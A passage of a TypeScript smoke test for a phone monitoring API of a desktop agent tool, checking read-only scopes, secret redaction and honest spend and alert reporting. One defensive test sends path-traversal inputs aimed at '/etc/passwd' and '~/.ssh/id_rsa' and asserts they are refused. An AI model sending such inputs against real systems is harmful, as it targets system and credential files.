    gitReview('init', '-q', '-b', 'main');
    gitReview('config', 'user.email', 'smoke@wanigan.test');
    gitReview('config', 'user.name', 'Smoke');
    fs.writeFileSync(path.join(reviewRepo, 'kept.txt'), 'one\n');
    fs.writeFileSync(path.join(reviewRepo, 'blob.bin'), Buffer.from([0, 1, 2, 0, 255, 7]));
    gitReview('add', '-A');
    gitReview('commit', '-qm', 'base');
    fs.writeFileSync(path.join(reviewRepo, 'kept.txt'), 'one\ntwo\n');
    fs.writeFileSync(path.join(reviewRepo, 'blob.bin'), Buffer.from([0, 1, 2, 0, 255, 9, 9]));
    const reviewProject = await addProject(reviewRepo);
    const asPhone = { headers: { authorization: `Bearer ${token}` } };
    const fileUrl = (file: string) => new URL(
      `api/repo/file?project=${encodeURIComponent(reviewProject.id)}&file=${encodeURIComponent(file)}`,
      monitor.localUrl,
    );
    const refusedWhileOff = await fetch(fileUrl('kept.txt'), asPhone);
    const refusedWhileOffBody = await refusedWhileOff.json() as { error?: string };
    setSetting('mobile_repository_review', '1');
    const diffResponse = await fetch(fileUrl('kept.txt'), asPhone);
    const filePatch = await diffResponse.json() as { patch?: string | null; reason?: string | null; added?: number | null };
    const binaryResponse = await fetch(fileUrl('blob.bin'), asPhone);
    const binaryFile = await binaryResponse.json() as { patch?: string | null; reason?: string | null };
    // Every shape the guard exists for, asked with the opt-in ON so a refusal
    // here is the path guard answering rather than the scope.
    const escapes = await Promise.all(
      ['/etc/passwd', '../../../etc/passwd', '~/.ssh/id_rsa', 'kept.txt/../kept.txt', 'never-changed.txt']
        .map(async (attempt) => (await fetch(fileUrl(attempt), asPhone)).status),
    );
    setSetting('mobile_repository_review', '0');
    check(refusedWhileOff.status === 403 && /disabled/.test(refusedWhileOffBody.error ?? ''),
      "one file's diff is refused with the repository-review opt-in off, by the dispatcher's declared scope rather than by anything inside the handler",
      refusedWhileOff.status);
    check(diffResponse.ok && (filePatch.patch ?? '').includes('@@') && (filePatch.patch ?? '').includes('+two')
      && filePatch.added === 1 && filePatch.reason === null
      && !JSON.stringify(filePatch).includes(reviewRepo),
    "with the opt-in on, tapping a changed file returns git's own hunks and the count that goes with them, and no path to where the repository sits on the Mac",
    filePatch.patch);
    check(binaryResponse.ok && binaryFile.patch === null && /binary/i.test(binaryFile.reason ?? ''),
      'a binary file answers with a sentence saying it is one rather than rendering its bytes as text',
      binaryFile.reason);
    check(escapes.every((status) => status === 404),
      'a path this screen never offered is refused whatever it looks like — absolute, traversing, home-relative, or simply a file git has not reported as changed',
      escapes.join(', '));
    check(!body.includes(privateMarker) && !body.includes('42424'),
      'the HTTP allow-list drops extra paths, commands, transcripts and pids even if its source grows', body);
    // Whether the operator will actually be told is part of every reading now,
    // and the two values that make the alert path work are deliberately not: the
    // topic is the ntfy subscription credential — anyone holding it receives
    // every alert — and the server is network-identifying metadata the page has
    // no use for.
    const alertConfig = mobile.mobileConfig();
    const alertBody = await (await fetch(apiUrl, { headers: { authorization: `Bearer ${token}` } })).text();
    const alertPath = (JSON.parse(alertBody) as {
      alerts?: { enabled: boolean; ready: boolean; blocked: string | null; lastOutcome: string };
    }).alerts;
    check(alertPath !== undefined && alertPath.enabled === false && alertPath.ready === false
      && typeof alertPath.blocked === 'string' && alertPath.blocked.length > 0
      && alertPath.lastOutcome === 'none'
      && !JSON.stringify(alertPath).includes(alertConfig.pushTopic)
      && !JSON.stringify(alertPath).includes('http'),
    'the paired phone is told the real state of its alert path — switched off, never attempted, and why — without the ntfy topic or server URL that would make it work',
    alertPath);

    const write = await fetch(apiUrl, { method: 'POST' });
    check(write.status === 405 && write.headers.get('allow') === 'GET',
      'the monitor has no write verb or remote-control route', write.status);
    // A phone showing a calm fleet while every alert has been failing for two
    // days is the silent failure this state exists to end, so a rejection has to
    // arrive as words. The stub answers 403 and echoes the topic back inside its
    // body, which is exactly where a diagnostic leaks the subscription
    // credential on its way to two different screens.
    const realFetch = globalThis.fetch;
    const alertTopic = mobile.mobileConfig().pushTopic;
    globalThis.fetch = (async () => new Response(
      JSON.stringify({ error: `topic ${alertTopic} is not allowed`, link: 'https://ntfy.example/docs' }),
      { status: 403, headers: { 'content-type': 'application/json' } },
    )) as typeof fetch;
    let rejectedAlert: Awaited<ReturnType<typeof mobile.sendMobilePush>>;
    try {
      rejectedAlert = await mobile.sendMobilePush({ title: 'Smoke alert path', body: 'Probing the failure report.' }, true);
    } finally { globalThis.fetch = realFetch; }
    const failedBody = await (await fetch(apiUrl, { headers: { authorization: `Bearer ${token}` } })).text();
    const failedPath = (JSON.parse(failedBody) as {
      alerts?: { lastOutcome: string; lastReason: string | null; lastHttpStatus: number | null; retryable: boolean };
    }).alerts;
    const failedReason = failedPath?.lastReason ?? '';
    check(rejectedAlert.ok === false && failedPath !== undefined
      && failedPath.lastOutcome === 'failed' && failedPath.lastHttpStatus === 403
      && failedPath.retryable === false && failedReason.includes('403')
      && !failedReason.includes(alertTopic) && !failedReason.includes('ntfy.example'),
    'a rejected alert reaches the phone as a reason and a status rather than as silence, with the topic and the server the ntfy body echoed back stripped out of it',
    failedPath);

    const controlUrl = new URL('api/control', monitor.localUrl).toString();
    const lockedControl = await fetch(controlUrl, { headers: { authorization: `Bearer ${token}` } });
    check(lockedControl.status === 403, 'paired monitoring stays read-only until remote control is separately enabled', lockedControl.status);
    // The page tells a switched-off console apart from a broken one with
    // /disabled/ against this sentence, so it is a contract, and it has to hold
    // on every control-scope route rather than only the one the console asks
    // for first. The route table is what makes that automatic.
    const lockedControlBody = await lockedControl.json() as { error?: string };
    const lockedTerminal = await fetch(new URL('api/terminal?session=s_mobile', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const lockedTerminalBody = await lockedTerminal.json() as { error?: string };
    check(lockedControlBody.error === 'Remote control is disabled in Wanigan Settings.'
      && lockedTerminal.status === 403
      && lockedTerminalBody.error === 'Remote control is disabled in Wanigan Settings.',
    'every control-scope route is refused with the exact sentence the page matches on, not just the first one the console asks for',
    `${lockedControl.status}:${lockedControlBody.error} / ${lockedTerminal.status}:${lockedTerminalBody.error}`);
    // A key press is a PTY write, so it is refused by the same switch and with
    // the same sentence as the two routes above — and refused before the rate
    // limiter, so a phone probing a switched-off console cannot spend the
    // operator's action budget on a run of 403s.
    const lockedKey = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'key', sessionId: 's_mobile', key: 'down' }),
    });
    const lockedKeyBody = await lockedKey.json() as { error?: string };
    check(lockedKey.status === 403
      && lockedKeyBody.error === 'Remote control is disabled in Wanigan Settings.'
      && /disabled/.test(lockedKeyBody.error),
    'pressing a key from a phone is refused by the remote-control switch with the exact sentence the page matches on, so a switched-off console reads as switched off rather than broken',
    `${lockedKey.status}:${lockedKeyBody.error}`);
    // The Manage hub reads through the monitor and writes through remote
    // control, and the split is the whole point: what this Mac starts on a
    // timer is a fact a read-only phone must be able to see, and stopping one
    // is a write that must not be reachable until the operator has separately
    // turned remote control on. Both verbs are checked, because a gate that
    // only refuses the destructive-sounding one is not a gate.
    const readOnlySchedule = schedule.createSchedule({
      name: 'smoke phone read-only schedule', cron: '0 3 * * *', kind: 'headless',
      payload: { prompt: 'audit', allProjects: true },
    });
    const monitorSchedules = await fetch(new URL('api/schedules', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const monitorScheduleBody = await monitorSchedules.json() as { schedules?: { id: string; name: string }[] };
    const lockedPause = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'pause', id: readOnlySchedule.id }),
    });
    const lockedPauseBody = await lockedPause.json() as { error?: string };
    const lockedResume = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'resume', id: readOnlySchedule.id }),
    });
    const lockedResumeBody = await lockedResume.json() as { error?: string };
    check(monitorSchedules.status === 200
      && (monitorScheduleBody.schedules ?? []).some((row) => row.id === readOnlySchedule.id)
      && lockedPause.status === 403 && lockedPauseBody.error === 'Remote control is disabled in Wanigan Settings.'
      && lockedResume.status === 403 && lockedResumeBody.error === 'Remote control is disabled in Wanigan Settings.'
      && schedule.listSchedules().find((row) => row.id === readOnlySchedule.id)?.enabled === true,
    'a read-only phone can see what this Mac starts on a timer but cannot change it: the schedule list answers on the monitor scope, and both pausing and resuming are refused by the remote-control switch with the exact sentence the page matches on — with the schedule still armed afterwards',
    `${monitorSchedules.status} / pause ${lockedPause.status}:${lockedPauseBody.error} / resume ${lockedResume.status}:${lockedResumeBody.error}`);
    schedule.deleteSchedule(readOnlySchedule.id);
    /* ── the runs panel · seeing the spend and stopping it are two gates ──
     * A headless fan-out is the work in Wanigan that costs money with nobody
     * at the keyboard, which makes seeing it a monitor question and killing it
     * a control one. Both verbs are checked, because a gate that only refuses
     * the destructive-sounding one is not a gate.
     */
    const lockedRunId = 'run_smoke_phone_locked';
    db().prepare(
      `INSERT INTO runs (id,name,model,status,config_json,kind,created_at,submitted_at)
       VALUES (?,?,'smoke-phone-model',?,'{}','headless',?,?)`
    ).run(lockedRunId, 'smoke phone locked fan-out', 'in_progress', Date.now() - 120_000, Date.now() - 120_000);
    db().prepare(
      `INSERT INTO headless_rows (run_id,project_id,project_name,project_path,status)
       VALUES (?,?,?,'/private/tmp/smoke-phone-repo','running')`
    ).run(lockedRunId, 'p_smoke_phone_locked', 'smoke phone repo');
    type PhoneRunRow = { id: string; cancelable: boolean };
    const monitorRuns = await fetch(new URL('api/runs', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const monitorRunsBody = await monitorRuns.json() as { runs?: PhoneRunRow[] };
    const lockedCancel = await fetch(new URL('api/runs', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'cancel', id: lockedRunId }),
    });
    const lockedCancelBody = await lockedCancel.json() as { error?: string };
    const lockedRunRow = db().prepare('SELECT status FROM headless_rows WHERE run_id=?')
      .get(lockedRunId) as { status: string } | undefined;
    check(monitorRuns.status === 200
      && (monitorRunsBody.runs ?? []).some((row) => row.id === lockedRunId && row.cancelable === true)
      && lockedCancel.status === 403
      && lockedCancelBody.error === 'Remote control is disabled in Wanigan Settings.'
      && lockedRunRow?.status === 'running',
    'a read-only phone can see the fan-out that is spending money right now but cannot stop it: the run list answers on the monitor scope, and cancelling is refused by the remote-control switch with the exact sentence the page matches on — with the repository still running afterwards',
    `${monitorRuns.status} / cancel ${lockedCancel.status}:${lockedCancelBody.error} row=${lockedRunRow?.status}`);
    db().prepare('DELETE FROM runs WHERE id=?').run(lockedRunId);
    /* ── the review inbox · seeing the queue and clearing it are two gates ──
     * What is waiting for a person is a fact about this Mac, and a monitor that
     * cannot say how much has piled up behind them has a hole in exactly the
     * place someone opens it to look. Taking the decision is a write — it
     * changes what Wanigan will tell agents about this work — so it sits behind
     * the separate remote-control opt-in. Both verbs are checked, because a
     * gate that only refuses one of them is not a gate. Neither POST below
     * spends the write budget: the dispatcher refuses a control-scope route
     * before the rate limiter is reached.
     */
    const learnRepo = await import('./learning/repository');
    const learnSignals = await import('./learning/signals');
    setSetting('learning_enabled', '1');
    const learnLockedSignal = learnSignals.recordSignal({
      kind: 'tool-failure', summary: 'smoke phone learning observation',
      taskHash: 'smoke-phone-learning-locked', detail: { ok: false },
    });
    const learnLocked = learnRepo.createCandidate({
      targetKind: 'memory', scope: 'personal',
      title: 'smoke phone locked proposal',
      proposedText: 'Run the offline suite before handing off a main-process change.',
      rationale: 'Recorded by the smoke suite.',
      confidence: 0.9, signalIds: [learnLockedSignal.id],
    });
    type PhoneLearningRow = { id: string; approvable: boolean;
      citations: { named: number; found: number; checked: boolean } };
    const learnMonitorRead = await fetch(new URL('api/learning', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const learnMonitorBody = await learnMonitorRead.json() as { enabled?: boolean; modelAssisted?: boolean; proposals?: PhoneLearningRow[] };
    const learnLockedApprove = await fetch(new URL('api/learning', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'approve', id: learnLocked.id }),
    });
    const learnLockedApproveBody = await learnLockedApprove.json() as { error?: string };
    const learnLockedReject = await fetch(new URL('api/learning', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'reject', id: learnLocked.id }),
    });
    const learnLockedRejectBody = await learnLockedReject.json() as { error?: string };
    const learnLockedAfter = learnRepo.getCandidate(learnLocked.id);
    check(learnMonitorRead.status === 200 && learnMonitorBody.enabled === true
      && learnMonitorBody.modelAssisted === false
      && (learnMonitorBody.proposals ?? []).some((row) => row.id === learnLocked.id)
      && learnLockedApprove.status === 403
      && learnLockedApproveBody.error === 'Remote control is disabled in Wanigan Settings.'
      && learnLockedReject.status === 403
      && learnLockedRejectBody.error === 'Remote control is disabled in Wanigan Settings.'
      && learnLockedAfter?.status === 'pending' && learnLockedAfter.reviewedAt === null,
    'a read-only phone can see what is waiting for a decision but cannot take one: the review inbox answers on the monitor scope, and both approving and rejecting are refused by the remote-control switch with the exact sentence the page matches on — with the proposal still pending and unreviewed afterwards',
    `${learnMonitorRead.status} / approve ${learnLockedApprove.status}:${learnLockedApproveBody.error} / reject ${learnLockedReject.status}:${learnLockedRejectBody.error} status=${learnLockedAfter?.status}`);
    db().prepare('DELETE FROM knowledge_candidates WHERE id=?').run(learnLocked.id);
    db().prepare('DELETE FROM learning_signals WHERE id=?').run(learnLockedSignal.id);
    const unknownRoute = await fetch(new URL('api/not-a-route', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const unknownRouteBody = await unknownRoute.json() as { error?: string };
    const wrongVerb = await fetch(controlUrl, { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: '{}' });
    await wrongVerb.arrayBuffer();
    check(unknownRoute.status === 404 && unknownRouteBody.error === 'Not found.'
      && wrongVerb.status === 405 && wrongVerb.headers.get('allow') === 'GET',
    'the phone API is a route table: an unregistered path is 404, and a registered path reached with the wrong verb is 405 naming the verbs it does answer',
    `${unknownRoute.status}/${wrongVerb.status} allow=${wrongVerb.headers.get('allow')}`);
    const remoteActions: string[] = [];
    mobile.configureMobileControlSource({
      projects: async () => [{ id: 'prj_mobile', name: 'Mobile repo', branch: 'main' }],
      providers: async () => [{ id: 'codex', label: 'Codex', available: true, models: [{ value: 'gpt-5.6-sol', label: 'GPT-5.6 Sol' }], efforts: ['high'] }],
      launch: async (input) => { remoteActions.push(`launch:${input.projectId}:${input.providerId}:${input.model ?? ''}:${input.effort ?? ''}:${input.prompt}`); return { id: 's_mobile', title: 'Codex · Mobile repo' }; },
      prompt: async (id, prompt) => { remoteActions.push(`prompt:${id}:${prompt}`); },
      interrupt: async (id) => { remoteActions.push(`interrupt:${id}`); return true; },
      key: async (id, sequence) => { remoteActions.push(`key:${id}:${JSON.stringify(sequence)}`); },
      terminal: async (id) => ({ title: `Terminal ${id}`, running: true, text: `\x1b[38;5;214msafe output\x1b[0m for ${id}\x1b]8;;https://example.com\x07` }),
    });
    await mobile.setMobileConfig({ remoteControlEnabled: true });
    const controlShell = await fetch(monitor.localUrl);
    check((await controlShell.text()).includes('Private remote control'),
      'the iPad shell labels its remote-control capability directly when the opt-in is enabled');
    const composedShell = await (await fetch(monitor.localUrl)).text();
    const sectionAnchors = mobile.MOBILE_SECTION_ANCHORS;
    const misplacedSections = sectionAnchors.filter((anchor) => composedShell.split(`id="${anchor}"`).length !== 2);
    check(sectionAnchors.length >= 3 && misplacedSections.length === 0,
      'the served page composes every registered screen section exactly once — none dropped by the registry, none rendered twice',
      `${sectionAnchors.length} sections, wrong count for: ${misplacedSections.join(', ') || 'none'}`);
    // The generic anchor sweep above passes vacuously for a screen that was
    // never registered, so the alert screen is named here — together with the
    // sentence that keeps the page honest about iOS. A web page cannot deliver a
    // background notification without being installed to the Home Screen and
    // wired to Web Push, which Wanigan has not done, and an alert panel that
    // implied otherwise would be worse than no panel at all.
    check(sectionAnchors.includes('alerts') && composedShell.split('id="alerts"').length === 2
      && composedShell.includes('id="alert-path"')
      && composedShell.includes('iOS does not deliver a web page'),
    'the alert screen is composed exactly once and says plainly that a closed page cannot be notified on iOS, rather than implying a background alert that will never arrive',
    `${composedShell.split('id="alerts"').length - 1} alert screens`);
    // The generic sweep above passes vacuously for a screen that was never
    // registered, so the Spend screen is named here too. It is the one Explore
    // destination the phone builds, and both of its halves have to be there:
    // a Spend tab that navigates to a blank panel looks exactly like a fleet
    // that cost nothing, which is the one thing this screen must never say.
    check(sectionAnchors.includes('spend') && composedShell.split('id="spend"').length === 2
      && composedShell.includes('id="spend-limits"') && composedShell.includes('id="spend-cost"')
      && composedShell.split('data-spend-days=').length === 4,
    'the Spend screen is composed exactly once, carrying both what is left and what it cost, and all three consumption windows',
    `${composedShell.split('id="spend"').length - 1} spend screens`);

    /* ── the Spend screen · the breach reading, and what it may not claim ──
     * The reason to open this screen away from a desk is not the cost curve;
     * it is whether something has gone past a line. Everything below is
     * asserted against the served JSON and the served page rather than against
     * the source, because a breach reading that reads well and reports the
     * wrong state is exactly the failure this screen exists to prevent.
     */
    const spendProbeNow = Date.now();
    const spendWindowFixture = (kind: string, scope: string | null, used: number) =>
      ({ kind, scope, usedPercent: used, resetsAtText: null, resetsAt: null });
    mobile.configureMobileExploreSource({
      spend: () => ({
        days: 14,
        limits: [
          { accountId: 'a_work', accountLabel: 'Work', harness: 'claude-code', identity: null,
            state: 'ok', detail: null, fetchedAt: spendProbeNow - 60_000, plan: 'max',
            windows: [spendWindowFixture('session', null, 40), spendWindowFixture('week', null, 100)], factors: [] },
          { accountId: 'a_personal', accountLabel: 'Personal', harness: 'claude-code', identity: null,
            state: 'ok', detail: null, fetchedAt: spendProbeNow - 60_000, plan: 'max',
            windows: [spendWindowFixture('week', null, 41)], factors: [] },
          { accountId: 'a_codex', accountLabel: 'Codex', harness: 'codex', identity: null,
            state: 'ok', detail: 'Codex reports a spend control has been reached for this account.',
            fetchedAt: spendProbeNow - 60_000, plan: null,
            windows: [spendWindowFixture('week', null, 12)], factors: [] },
          { accountId: 'a_old', accountLabel: 'Ancient', harness: 'claude-code', identity: null,
            state: 'ok', detail: null, fetchedAt: spendProbeNow - 40 * 60_000, plan: 'max',
            windows: [spendWindowFixture('session', null, 10)], factors: [] },
          { accountId: 'a_other', accountLabel: 'Gemini', harness: 'gemini', identity: null,
            state: 'unsupported', detail: 'Wanigan has no way to ask a gemini account what it has left.',
            fetchedAt: null, plan: null, windows: [], factors: [] },
        ],
        consumption: [], daily: [],
      }),
      budgets: () => ({
        capped: 2,
        breached: [
          { scopeId: null, scopeName: 'All projects', monthlyUsd: 40, spentUsd: 42.1, sessionUsd: 42.1,
            batchUsd: 0, warnAt: 0.8, projectedUsd: 210.5, daysElapsed: 6, daysInMonth: 30,
            reason: 'over-budget', limitUsd: 40, warnUsd: 32, summary: 'unused by the phone',
            window: { monthStart: spendProbeNow, monthLabel: 'September 2026', daysElapsed: 6, daysInMonth: 30 } },
          { scopeId: 'p_smoke', scopeName: 'wanigan', monthlyUsd: 50, spentUsd: 12, sessionUsd: 12,
            batchUsd: 0, warnAt: 0.8, projectedUsd: 60, daysElapsed: 6, daysInMonth: 30,
            reason: 'projected-over', limitUsd: 50, warnUsd: 40, summary: 'unused by the phone',
            window: { monthStart: spendProbeNow, monthLabel: 'September 2026', daysElapsed: 6, daysInMonth: 30 } },
        ],
      }),
    });
    type PhoneBudgetBreach = { reason: string; basis: string; scopeName: string; projectedUsd: number };
    type PhoneLimitBreach = {
      reason: string; accountLabel: string; accountState: string; kind: string | null;
      usedPercent: number | null; readAgeMs: number | null;
      relief: { accountLabel: string; usedPercent: number } | null;
    };
    type PhoneSpend = {
      budgetsRead: boolean; budgetsCapped: number; clearWindows: number; nearPercent: number;
      budgetBreaches: PhoneBudgetBreach[]; limitBreaches: PhoneLimitBreach[];
      accounts: { label: string }[];
    };
    const spendRead = await fetch(new URL('api/explore?panel=spend&days=14', monitor.localUrl),
      { headers: { authorization: `Bearer ${token}` } });
    const spendBody = await spendRead.json() as PhoneSpend;
    const breachOf = (label: string, kind: string | null) =>
      spendBody.limitBreaches.find((row) => row.accountLabel === label && row.kind === kind);

    check(spendRead.status === 200
      && spendBody.budgetBreaches[0]?.reason === 'over-budget'
      && spendBody.limitBreaches[0]?.reason === 'past'
      && spendBody.limitBreaches[0]?.accountLabel === 'Work'
      && spendBody.limitBreaches[0]?.usedPercent === 100
      && spendBody.limitBreaches[0]?.readAgeMs !== null,
    'the phone Spend reading answers what is past a line before it answers anything else, with the money the operator capped ahead of the provider ceiling, and every entry carries the value that was measured and the age of the reading that carries it rather than an unevidenced state',
    `${spendRead.status} budgets=${spendBody.budgetBreaches.map((row) => row.reason).join(',')} limits=${spendBody.limitBreaches.map((row) => `${row.reason}:${row.accountLabel}`).join(',')}`);

    // The negative. Exactly one figure on this screen is arithmetic about days
    // that have not happened, and it must be the only thing wearing the
    // estimate label — a measured overspend presented as a projection is as
    // wrong as a projection presented as a fact.
    const spendMislabelled = spendBody.budgetBreaches.filter((row) =>
      (row.basis === 'estimate') !== (row.reason === 'projected-over'));
    check(spendMislabelled.length === 0
      && spendBody.budgetBreaches.some((row) => row.reason === 'projected-over' && row.basis === 'estimate')
      && spendBody.budgetBreaches.some((row) => row.reason === 'over-budget' && row.basis === 'measured'),
    'the run rate is the only figure on the Spend reading that calls itself an estimate, and it calls itself one in the payload rather than in a footnote — a budget that is genuinely over is never softened into a projection, and a projection is never presented as spend',
    spendBody.budgetBreaches.map((row) => `${row.reason}=${row.basis}`).join(' '));

    // A reading old enough to be stale is not evidence that a window is below
    // its line now; it is evidence of where it was. Neither the stale account
    // nor the account Wanigan cannot ask may be counted as clear.
    check(breachOf('Ancient', null)?.reason === 'stale'
      && breachOf('Gemini', null)?.reason === 'unread'
      && breachOf('Gemini', null)?.accountState === 'unsupported'
      && spendBody.clearWindows === 3
      && spendBody.nearPercent === 95,
    'a limit reading that has gone stale and an account Wanigan has no way to ask each report themselves as their own state on the phone rather than being counted as clear or quietly left off the screen, so the count behind "nothing is over its limit" only ever covers windows a current reading actually established',
    `stale=${breachOf('Ancient', null)?.reason} unasked=${breachOf('Gemini', null)?.reason} clear=${spendBody.clearWindows} of ${spendBody.accounts.length} accounts`);

    // A complete reading can still carry the fact the percentages do not: the
    // Codex spend control is what explains a refused run while every window
    // looks fine, and the relief pairing is measured rather than advised.
    check(breachOf('Codex', null)?.reason === 'control'
      && breachOf('Work', 'week')?.relief?.accountLabel === 'Personal'
      && breachOf('Work', 'week')?.relief?.usedPercent === 41
      && spendBody.limitBreaches.every((row) => row.relief === null || row.reason === 'past'),
    'a provider control reported alongside a complete reading reaches the phone as its own entry rather than being lost behind three healthy percentages, and the only entries offering somewhere else to work are the ones genuinely exhausted, paired against a measured window on another login of the same agent',
    `control=${breachOf('Codex', null)?.reason} relief=${JSON.stringify(breachOf('Work', 'week')?.relief)}`);

    // A budget read that failed is not a budget that is fine. The empty list
    // and the failed read must not arrive as the same answer.
    mobile.configureMobileExploreSource({
      spend: () => ({ days: 14, limits: [], consumption: [], daily: [] }),
      budgets: () => { throw new Error('the budgets table is unreadable'); },
    });
    const spendNoBudgets = await fetch(new URL('api/explore?panel=spend&days=14', monitor.localUrl),
      { headers: { authorization: `Bearer ${token}` } });
    const spendNoBudgetsBody = await spendNoBudgets.json() as PhoneSpend;
    check(spendNoBudgets.status === 200
      && spendNoBudgetsBody.budgetsRead === false
      && spendNoBudgetsBody.budgetBreaches.length === 0
      && spendNoBudgetsBody.budgetsCapped === 0,
    'a budget reading that failed reaches the phone as a failed reading rather than as an empty one, and it does not take the accounts and the cost figures down with it — an unreadable budgets table is evidence about spend and never a reason to stop reporting everything else',
    `${spendNoBudgets.status} budgetsRead=${spendNoBudgetsBody.budgetsRead} capped=${spendNoBudgetsBody.budgetsCapped}`);

    // The second negative, on the shape rather than the values: no field on
    // this wire blends a budget and a provider ceiling into one number, and
    // none of the four honest states is a colour with no word beside it.
    const spendSectionSrc = sourceOf('src/main/mobile/page/sections/spend.ts');
    const spendRouteSrc = sourceOf('src/main/mobile/explore.ts');
    check(!/\b(healthScore|budgetHealth|overallScore|spendScore|grade)\b/.test(spendRouteSrc)
      && !/\b(healthScore|budgetHealth|overallScore|spendScore|grade)\b/.test(spendSectionSrc)
      && spendSectionSrc.includes("word: 'Over budget'")
      && spendSectionSrc.includes("word: 'Past its limit'")
      && spendSectionSrc.includes("word: 'Trending over'")
      && spendSectionSrc.includes('ui.empty(\'Nothing is over its limit.\'')
      && spendSectionSrc.includes('ui.observed()'),
    'the Spend breach reading never blends a budget and a provider ceiling into one number, every state on it carries a word beside its glyph in the desktop’s own vocabulary, and the claim that nothing is over a limit is gated on a poll having actually returned rather than printed over an empty payload',
    `${spendBody.budgetBreaches.length} budget and ${spendBody.limitBreaches.length} limit entries, none scored`);

    check(composedShell.split('id="spend-breaches"').length === 2
      && composedShell.indexOf('id="spend-breaches"') < composedShell.indexOf('id="spend-limits"')
      && composedShell.indexOf('id="spend-limits"') < composedShell.indexOf('id="spend-cost"'),
    'the breach block is composed exactly once and above both halves of the Spend screen, because the reason to open this screen away from a desk goes first on it and a cost curve nobody asked for does not',
    `${composedShell.split('id="spend-breaches"').length - 1} breach blocks`);
    /* ── the Scout screen · composed once, and honest about being a read ──
     * The generic anchor sweep above passes vacuously for a screen that was
     * never registered, so this one is named here as Spend and the alert
     * panel are. The second half is the part that matters more: every write
     * the Scout offers is either egress against a source allow-list or a
     * commitment against a working tree this device does not have, so the
     * screen makes exactly one GET and says so rather than offering a Create
     * Goal button that would do something smaller than its label. */
    const scoutScreen = (await import('./mobile/page/sections/scout')).SCOUT_SECTION;
    const scoutCalls = scoutScreen.script.match(/api\([^)]*\)/g) ?? [];
    check(sectionAnchors.includes('scout') && composedShell.split('id="scout"').length === 2
      && composedShell.includes('id="scout-run"') && composedShell.includes('id="scout-list"')
      && composedShell.includes('creating a Goal from a proposal is a Mac action')
      && scoutCalls.length === 1 && scoutCalls[0] === "api('api/scout')",
    'the Scout screen is composed exactly once and is a read and nothing else: one GET, no write of any kind, and it says plainly that starting a scan and creating a Goal are Mac actions',
    `${composedShell.split('id="scout"').length - 1} scout screens, calls: ${scoutCalls.join(' | ') || 'none'}`);

    /* ── firing a skill · a command you can send, not a file you can edit ──
     * shared/mobile-nav.ts still keeps the Skills SCREEN on the Mac, and it
     * should: writing one edits a file inside a working tree this device does
     * not have. Firing one that already exists needs no working tree and edits
     * nothing, so it lives on the Agent screen — and the absent reason was
     * narrowed in the same change rather than left standing while a route
     * quietly contradicted it. These hold the two properties that keep those
     * halves apart: no path crosses, and the phone never says what to type. */
    const skillsWire = await import('./mobile/skills');
    const skillsSection = (await import('./mobile/page/sections/skills')).SKILLS_SECTION;
    const skillsSrc = sourceOf('src/main/mobile/skills.ts');
    const skillRows = [
      { invoke: '/review-gate', name: 'review-gate', label: 'Review gate', description: 'Hold the gate before handing off.', source: 'project', harness: 'claude-code', invocable: { user: true } },
      { invoke: '/tdd', name: 'tdd', label: 'Red, green, refactor', description: 'Test-driven development.', source: 'user', harness: 'claude-code', invocable: { user: true } },
      { invoke: '/locked', name: 'locked', label: 'Locked', description: 'Turned off in settings.', source: 'plugin', harness: 'claude-code', invocable: { user: false } },
      { invoke: '', name: 'codex-only', label: 'Codex only', description: 'A Codex skill file with no verified invocation.', source: 'agents-user', harness: 'codex', invocable: { user: 'unknown' } },
    ] as const;
    const skillList = skillsWire.mobileSkillList(skillRows, '');
    const skillJson = JSON.stringify(skillList.skills);
    // Both routes' declared scopes, in file order. The repository scope is the
    // only one allowed to put a path on this wire and neither of these is it —
    // asserted from the route declarations rather than from a bare substring,
    // because ./mobile/skills.ts deliberately never spells that literal even in
    // prose: a false hit in the grep dispatch.ts names is the one thing that
    // would make its sentence untrustworthy.
    const skillScopes = (skillsSrc.match(/scope: '(?:monitor|control|repo)'/g) ?? []).join(' ');
    check(skillList.total === 3 && skillList.skills.length === 3
      && !/"(?:path|dir|projectId)"\s*:/.test(skillJson) && !/\.claude|\.agents|\/Users\//.test(skillJson)
      && skillList.skills.map((row) => row.origin).join(',') === 'project,personal,plugin'
      && skillScopes === "scope: 'monitor' scope: 'control'",
    'the phone is told a command, one line of description and a WORD for where a skill came from, never the directory it came from — neither of these routes declares the repository scope that dispatch.ts promises is the complete list of routes able to put a path on this wire',
    `${skillList.skills.map((row) => `${row.invoke} · ${row.origin}`).join(', ') || 'none'}; scopes: ${skillScopes || 'none'}`);

    const skillOmitted = skillsWire.mobileSkillsPayload(
      { skills: skillRows, agentSkillCount: 4, builtinNote: 'the ones seen so far, not every built-in', blocked: null }, '');
    const skillBuiltin = skillsWire.mobileSkillsPayload({
      skills: [...skillRows, { invoke: '/dataviz', name: 'dataviz', label: 'Dataviz', description: 'Charts.', source: 'builtin', harness: 'claude-code', invocable: { user: true } }],
      agentSkillCount: 0, builtinNote: 'the ones seen so far, not every built-in', blocked: null,
    }, '');
    check(skillOmitted.total === 3 && skillOmitted.agentSkillCount === 4 && skillOmitted.builtinNote === null
      && skillBuiltin.builtinCount === 1 && skillBuiltin.builtinNote !== null
      && skillsSection.script.includes('Wanigan has not verified how Codex invokes one'),
